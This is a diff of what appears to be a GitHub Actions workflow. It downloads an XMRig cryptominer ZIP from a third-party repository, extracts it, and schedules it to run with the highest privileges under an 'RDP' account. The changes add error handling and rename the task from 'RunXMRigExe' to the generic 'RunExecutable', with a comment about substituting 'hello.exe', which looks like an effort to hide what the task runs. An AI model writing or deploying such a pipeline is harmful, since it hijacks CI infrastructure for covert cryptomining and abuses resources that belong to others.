@@ -47,25 +47,44 @@ jobs:
           $url = "https://github.com/Darkbarrier/RDP/raw/main/xmrig-6.24.0-windows-x64.zip"
           $zipPath = "C:\xmrig.zip"
           $extractPath = "C:\xmrig"
-          Invoke-WebRequest -Uri $url -OutFile $zipPath
-          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
-          Remove-Item $zipPath -Force
-          Write-Host "XMRig extracted to $extractPath"
-      - name: Create Task Scheduler Task for hello.exe
-        run: |
-          $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"
-          if (-not (Test-Path $exePath)) {
-              Write-Error "xmrig.exe not found at $exePath"
+          try {
+              Write-Host "Downloading ZIP from $url..."
+              Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
+              Write-Host "Extracting ZIP to $extractPath..."
+              Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction Stop
+              Remove-Item $zipPath -Force -ErrorAction Stop
+              Write-Host "XMRig extracted to $extractPath"
+              $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"  # Adjust to "C:\xm\hello.exe" if needed
+              if (-not (Test-Path $exePath)) {
+                  Write-Error "Executable not found at $exePath"
+                  exit 1
+              }
+          } catch {
+              Write-Error "Failed to download or extract ZIP: $_"
               exit 1
           }
-          $taskName = "RunXMRigExe"
+      - name: Create Task Scheduler Task for Executable
+        run: |
+          $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"  # Adjust to "C:\xm\hello.exe" if needed
+          if (-not (Test-Path $exePath)) {
+              Write-Error "Executable not found at $exePath"
+              exit 1
+          }
+          $taskName = "RunExecutable"
           $action = New-ScheduledTaskAction -Execute $exePath
           $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
-          $principal = New-ScheduledTaskPrincipal -UserId "RDP" -LogonType Password -RunLevel Highest
+          $principal = New-ScheduledTaskPrincipal -UserId "RDP" -LogonType Interactive -RunLevel Highest
           $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
           try {
-              Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Password ${{ secrets.RDP_PASSWORD }} -Force
+              Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
               Write-Host "Scheduled task '$taskName' created to run $exePath as administrator."
+              $task = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
+              if ($task) {
+                  Write-Host "Task '$taskName' successfully registered."
+              } else {
+                  Write-Error "Task verification failed: Task not found."
+                  exit 1
+              }
           } catch {
               Write-Error "Failed to create scheduled task: $_"
               exit 1
